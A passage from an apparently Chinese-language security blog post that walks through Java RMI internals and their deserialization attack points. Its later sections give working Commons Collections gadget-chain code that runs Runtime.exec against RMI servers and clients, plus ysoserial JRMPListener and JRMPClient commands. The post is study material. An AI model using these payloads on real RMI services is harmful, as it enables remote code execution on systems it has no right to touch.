id=\"客户端请求注册中心-客户端\"><a href=\"#客户端请求注册中心-客户端\" class=\"headerlink\" title=\"客户端请求注册中心-客户端\"></a>客户端请求注册中心-客户端</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br></pre></td></tr></table></figure>\n\n<p><strong>LocateRegistry#getRegistry()</strong> 首先通过传入的host与port创建了一个liveref用于网络请求，然后通过UnicastRef进行封装，然后与注册中心的代理注册逻辑一样，创建了相同的一个 RegistryImpl_Stub 对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707230700835.png\" alt=\"image-20220707230700835\"></p>\n<p>接下来通过lookup方法与registry端通信，查找远程对象从而获取存根</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Hello stub &#x3D; (Hello) registry.lookup(&quot;hello&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>方法的开始通过newCall与registry进行通信，下面分为三个部分：</p>\n<ol>\n<li>通过<strong>序列化</strong>将要查找的name写到输出流里面</li>\n<li>调用UnicastRef的 <strong>invoke</strong> 方法，invoke中调用 <strong>StreamRemoteCall#executeCall</strong>，去释放输出流</li>\n<li>获取输入流，将返回值进行 <strong>反序列化</strong></li>\n</ol>\n<p>第三步返回值经过反序列化之后就是获取的注册中心的动态代理stub</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707234315142.png\" alt=\"image-20220707234315142\"></p>\n<p>这里有两个可攻击的点，一个是在lookup中的反序列化的点，可通过registry返回恶意类。二是在executeCall中，如果返回值为异常，进入case中会进行反序列化。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707235359916.png\" alt=\"image-20220707235359916\"></p>\n<p>那么lookup中的反序列化在其他的方法中并不普遍存在，例如bind等方法是没有的，但是这些方法都有invoke的调用，即都有可能进入case中，所以invoke中的反序列化点存在普遍性，利用范围也更大。</p>\n<h2 id=\"客户端请求注册中心-注册中心端\"><a href=\"#客户端请求注册中心-注册中心端\" class=\"headerlink\" title=\"客户端请求注册中心-注册中心端\"></a>客户端请求注册中心-注册中心端</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Hello stub &#x3D; (Hello) registry.lookup(&quot;hello&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>在 Registry 端，由  <strong>sun.rmi.transport.tcp.TCPTransport#handleMessages</strong> 来处理请求，调用 <strong>serviceCall</strong> 方法处理。</p>\n<p>断点下到 handleMessages 中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708003610868.png\" alt=\"image-20220708003610868\"></p>\n<p><strong>serviceCall</strong> 方法中从 ObjectTable 中获取封装的 Target 对象，并获取其中的封装的 UnicastServerRef 以及 RegistryImpl 对象。然后调用 <strong>UnicastServerRef</strong> 的 <strong>dispatch</strong> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708004719188.png\" alt=\"image-20220708004719188\"></p>\n<p>因为skel不为空，判定为registery，就调用了 <strong>oldDispatch</strong>，这里判断了 this.skel 是否为空，用来区别自己是 Registry 还是 Server。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708004910700.png\" alt=\"image-20220708004910700\"></p>\n<p>调用 <strong>RegistryImpl_Skel#dispatch</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708005005512.png\" alt=\"image-20220708005005512\"></p>\n<p>RegistryImpl_Skel 的 dispatch 方法根据流中写入的不同的操作类型分发给不同的方法处理，例如 0 代表着 bind 方法，2 代表lookup方法，这里为lookup，通过 <strong>反序列化获取要查找的值</strong>，然后调用 <strong>RegistryImpl#lookup()</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708005355785.png\" alt=\"image-20220708005355785\"></p>\n<p>lookup从bindings中进行get获取</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708005714253.png\" alt=\"image-20220708005714253\"></p>\n<p>这里存在一个反序列化的点，可通过客户端攻击Registry端。</p>\n<p>获取完后返回 <strong>RegistryImpl_Skel#dispatch</strong>，将获取的值序列化传过去</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711034020673.png\" alt=\"image-20220711034020673\"></p>\n<h2 id=\"客户端请求服务端-客户端\"><a href=\"#客户端请求服务端-客户端\" class=\"headerlink\" title=\"客户端请求服务端-客户端\"></a>客户端请求服务端-客户端</h2><p>接下来客户端调用服务端的远程对象</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">stub.sayHello();</span><br></pre></td></tr></table></figure>\n\n<p>因为获取的是动态代理，所以走到 <strong>RemoteObjectInvocationHandler#invoke</strong>，跳过几个if判断后走到 <strong>invokeRemoteMethod</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708011751752.png\" alt=\"image-20220708011751752\"></p>\n<p>在 <strong>invokeRemoteMethod</strong> 中实际是委托 RemoteRef 的子类 <strong>UnicastRef#invoke</strong> 方法执行调用。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708011806230.png\" alt=\"image-20220708011806230\"></p>\n<p>UnicastRef 的 invoke 方法是一个建立连接，执行调用，并读取结果并反序列化的过程。这里，UnicastRef 包含属性 LiveRef ，LiveRef 类中的 Endpoint、Channel 封装了与网络通信相关的方法。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708012504230.png\" alt=\"image-20220708012504230\"></p>\n<p>如果方法有参数，调用 <strong>marshalValue</strong> 将参数写入到输出流，然后调用 executeCall</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708012902061.png\" alt=\"image-20220708012902061\"></p>\n<p>executeCall中通过 <strong>releaseOutputStream()</strong> 释放输出流，触发调用。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708013740871.png\" alt=\"image-20220708013740871\"></p>\n<p>executeCall之后，接受返回的输入流，通过 <strong>unmarshalValue()</strong> 去<strong>反序列化</strong>接受返回值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708014057671.png\" alt=\"image-20220708014057671\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708014156699.png\" alt=\"image-20220708014156699\"></p>\n<h2 id=\"客户端请求服务端-服务端\"><a href=\"#客户端请求服务端-服务端\" class=\"headerlink\" title=\"客户端请求服务端-服务端\"></a>客户端请求服务端-服务端</h2><p>依然是 handleMessages 中的 <strong>UnicastServerRef 的 dispatch</strong> ，可以对比着 客户端请求注册中心-注册中心端 来看</p>\n<p>在客户端释放输出流后，服务端通过getInputStream()获取输入流。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708020612105.png\" alt=\"image-20220708020612105\"></p>\n<p>跳过if，获取method名称，unmarshalValue用来 <strong>反序列化传入的参数</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708020905650.png\" alt=\"image-20220708020905650\"></p>\n<p>接着，在释放输入流后，反射调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708021035368.png\" alt=\"image-20220708021035368\"></p>\n<p>服务端再将返回值通过marashalvalue序列化传给客户端</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708021255995.png\" alt=\"image-20220708021255995\"></p>\n<h2 id=\"DGC\"><a href=\"#DGC\" class=\"headerlink\" title=\"DGC\"></a>DGC</h2><p>在远程对象的创建一节，知道了 <strong>服务端</strong> 通过 <strong>ObjecyTable#putTarget</strong> 将注册对象put到objTable中，其中有默认的DGCImpl对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220709021230735.png\" alt=\"image-20220709021230735\"></p>\n<p>来看一下产生的代码：调用静态变量dgcLog，那么当调用一个类的静态变量的时候是会对类进行类初始化</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220709021506791.png\" alt=\"image-20220709021506791\"></p>\n<p>跟进发现静态代码块，使用单例模式创建了一个DGCImpl对象，这个对象就是RMI的分布式垃圾处理对象，一旦有远程对象被创建，就会实例化这个对象，但也只会创建这一次。DGC的创建模式 <strong>类似于注册中心</strong> 的创建也是系统的内置类，所以是直接创建了 <strong>DGCImpl_Stub</strong>类，而不是创建的动态代理。并且设置了disp的skeleton是 <strong>DGCImpl_Skel</strong>。最后同样把这些放进Target，把Target保存进ObjectTable。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220709021927384.png\" alt=\"image-20220709021927384\"></p>\n<p>那么在 <strong>客户端</strong> 进行调用时会不会也同请求注册中心一样，在本地生成一个DGCImpl_Stub？答案为是的。</p>\n<p>在 RegistryImpl_Stub#lookup的ref.done中，在接受服务端的返回值后，通过done的后续调用创建DGCImpl_Stub，并调用了其中的 <strong>DGCImpl_Stub#dirty</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711030934849.png\" alt=\"image-20220711030934849\"></p>\n<p>关注一下dirty函数，两个点 1. invoke触发UnicastRef的execCall从而进入switch反序列化。2.获取输入流，readObject</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711032112396.png\" alt=\"image-20220711032112396\"></p>\n<p>再看一下 <strong>服务端</strong> ，依然是 handleMessages 中的 <strong>UnicastServerRef 的 dispatch</strong> ，skel不为空进入 <strong>oldDispatch</strong> 最后进入<strong>DGCImpl_Skel#dispatch</strong>。两个case语句，一个clean方法基本不会调用，另一个case为dirty部分，两个case中都调用了readObject，存在反序列化攻击点</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711032934092.png\" alt=\"image-20220711032934092\"></p>\n<h1 id=\"攻击思路\"><a href=\"#攻击思路\" class=\"headerlink\" title=\"攻击思路\"></a>攻击思路</h1><p>整体的RMI流程已经基本分析，可以看到不管是Server端，Registry端和Client端都存在反序列化利用的点。其实说白了就跟那排列组合没啥区别。</p>\n<p>1、攻击客户端：</p>\n<blockquote>\n<p>RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端<br>DGCImpl_Stub#dirty-&gt;服务端攻击客户端<br>UnicastRef#invoke-&gt;服务端攻击客户端<br>StreamRemoteCall#executeCall-&gt;服务端/注册中心攻击客户端</p>\n</blockquote>\n<p>2、攻击服务端</p>\n<blockquote>\n<p>UnicastServerRef#dispatch-&gt;客户端攻击服务端<br>DGCImpl_Skel#dispatch-&gt;客户端攻击服务端</p>\n</blockquote>\n<p>3、攻击注册中心</p>\n<blockquote>\n<p>RegistryImpl_Skel#dispatch-&gt;客户端/服务端攻击注册中心</p>\n</blockquote>\n<h1 id=\"攻击实现\"><a href=\"#攻击实现\" class=\"headerlink\" title=\"攻击实现\"></a>攻击实现</h1><p>大佬总结图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200701101308-6810e0aa-bb40-1.png\"></p>\n<h2 id=\"客户端攻击服务端\"><a href=\"#客户端攻击服务端\" class=\"headerlink\" title=\"客户端攻击服务端\"></a>客户端攻击服务端</h2><p>服务端的UnicastServerRef#dispatch调用了unmarshalValue。如果服务端就收的是object，那么客户端把参数设置成payload就能攻击了。如果是其他类型下面再讨论</p>\n<p>Server端定义接受Object</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.Remote;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.RemoteException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Hello</span> <span class=\"keyword\">extends</span> <span class=\"title\">Remote</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">String <span class=\"title\">sayHello</span><span class=\"params\">(Object name)</span> <span class=\"keyword\">throws</span> RemoteException</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Client</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Client</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取注册中心</span></span><br><span class=\"line\">        Registry registry = LocateRegistry.getRegistry(<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">1099</span>);</span><br><span class=\"line\">        Hello stub = (Hello) registry.lookup(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">        stub.sayHello(getpayload());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">getpayload</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        <span class=\"comment\">//Map lazymap = LazyMap.decorate(map, chainedTransformer);</span></span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazymap,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; hashmap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        hashmap.put(tiedMapEntry,<span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">        lazymap.remove(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = LazyMap.class;</span><br><span class=\"line\">        Field factory = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">        factory.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        factory.set(lazymap,chainedTransformer);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hashmap;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果服务端接受的类型为String，那么在服务端就会找不到对应的调用方法，这个对应方法，是在 UnicastServerRef 的 dispatch 方法中在 this.hashToMethod_Map 中通过 Method 的 hash 来查找的。这个 hash 实际上是一个基于方法签名的 SHA1 hash 值。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711045646059.png\" alt=\"image-20220711045646059\"></p>\n<p>在客户端的 RemoteObjectInvocationHandler#invokeRemoteMethod 是计算method的hash地方，我们可以下断点到这里，然后在计算hash之前修改method的值为String</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">methos&#x3D;ClassLoader.getSystemClassLoader().loadClass(&quot;org.example.IRemoteObj&quot;).getDeclaredMethod(&quot;sayHello&quot;,String.class)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711050329226.png\" alt=\"image-20220711050329226\"></p>\n<p>或者重写invoke</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">1099</span>);</span><br><span class=\"line\">        IRemoteObj remoteObj = (IRemoteObj) registry.lookup(<span class=\"string\">&quot;remoteObj&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//        HashMap evilMap = genEvilMap();</span></span><br><span class=\"line\"><span class=\"comment\">//        remoteObj.sayHello(evilMap);</span></span><br><span class=\"line\">        invoke(remoteObj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">invoke</span><span class=\"params\">(IRemoteObj remoteObj)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field hField = remoteObj.getClass().getSuperclass().getDeclaredField(<span class=\"string\">&quot;h&quot;</span>);</span><br><span class=\"line\">        hField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        Object remoteObjectInvocationHandler = hField.get(remoteObj);</span><br><span class=\"line\"></span><br><span class=\"line\">        Field refField = remoteObjectInvocationHandler.getClass().getSuperclass().getDeclaredField(<span class=\"string\">&quot;ref&quot;</span>);</span><br><span class=\"line\">        refField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        UnicastRef ref = (UnicastRef) refField.get(remoteObjectInvocationHandler);</span><br><span class=\"line\"></span><br><span class=\"line\">        Method method = IRemoteObj.class.getDeclaredMethod(<span class=\"string\">&quot;sayHello&quot;</span>, String.class);</span><br><span class=\"line\"></span><br><span class=\"line\">        Method methodToHash_mapsMethod = remoteObjectInvocationHandler.getClass().getDeclaredMethod(<span class=\"string\">&quot;getMethodHash&quot;</span>,Method.class);</span><br><span class=\"line\">        methodToHash_mapsMethod.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        <span class=\"keyword\">long</span> hash = (<span class=\"keyword\">long</span>) methodToHash_mapsMethod.invoke(remoteObj, method);</span><br><span class=\"line\"></span><br><span class=\"line\">        ref.invoke(remoteObj, method, <span class=\"keyword\">new</span> Object[]&#123;genEvilMap()&#125;, hash);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"注册中心攻击客户端\"><a href=\"#注册中心攻击客户端\" class=\"headerlink\" title=\"注册中心攻击客户端\"></a>注册中心攻击客户端</h2><p>客户端通过调用lookup，list等，会反序列化从注册中心发送的东西，注册中心只要绑定一个恶意的对象即可</p>\n<p>Server</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.Remote;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Server</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> RemoteHelloworld();</span><br><span class=\"line\">        Remote Evil = <span class=\"keyword\">new</span> Evil();</span><br><span class=\"line\">        Registry r = LocateRegistry.createRegistry(<span class=\"number\">1099</span>);</span><br><span class=\"line\">        r.bind(<span class=\"string\">&quot;hello&quot;</span>,Evil);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Evil.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.Serializable;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.Remote;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Evil</span> <span class=\"keyword\">implements</span> <span class=\"title\">Remote</span>, <span class=\"title\">Serializable</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Map map;</span><br><span class=\"line\"></span><br><span class=\"line\">    Evil() <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.map = getpayload();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map&lt;Object, Object&gt; <span class=\"title\">getpayload</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        <span class=\"comment\">//Map lazymap = LazyMap.decorate(map, chainedTransformer);</span></span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazymap,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; hashmap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        hashmap.put(tiedMapEntry,<span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">        lazymap.remove(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = LazyMap.class;</span><br><span class=\"line\">        Field factory = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">        factory.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        factory.set(lazymap,chainedTransformer);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hashmap;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击JRMP客户端\"><a href=\"#攻击JRMP客户端\" class=\"headerlink\" title=\"攻击JRMP客户端\"></a>攻击JRMP客户端</h2><p>只要客户端的stub发起JRMP请求，就会调用UnicastRef#invoke，也就会调用StreamRemoteCall#executeCall，导致被反序列化攻击。这里想实现攻击需要自己实现一个恶意服务端，把返回的异常信息改成payload，这里利用ysoserial里面的exploit/JRMPListener，去起一个假的Server</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"DGC攻击服务端\"><a href=\"#DGC攻击服务端\" class=\"headerlink\" title=\"DGC攻击服务端\"></a>DGC攻击服务端</h2><p>这块有点复杂。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections6 calc.exe</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h1><p>简单了解了一下RMI的流程以及攻击面，其中细节以及攻击的实现，以及后续的jdk修复以及绕过等等还有很多要学习，但是深感自身的不足，能力有限。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://su18.org/post/rmi-attack/\">Java RMI 攻击由浅入深 | 素十八</a></p>\n<p><a href=\"https://halfblue.github.io/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/\">RMI反序列化漏洞之三顾茅庐-流程分析 | Halfblue</a></p>\n<p><a href=\"https://halfblue.github.io/2021/11/02/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0/\">RMI反序列化漏洞之三顾茅庐-攻击实现 | Halfblue</a></p>\n<p><a href=\"https://tttang.com/archive/1430/#toc__3\">JAVA 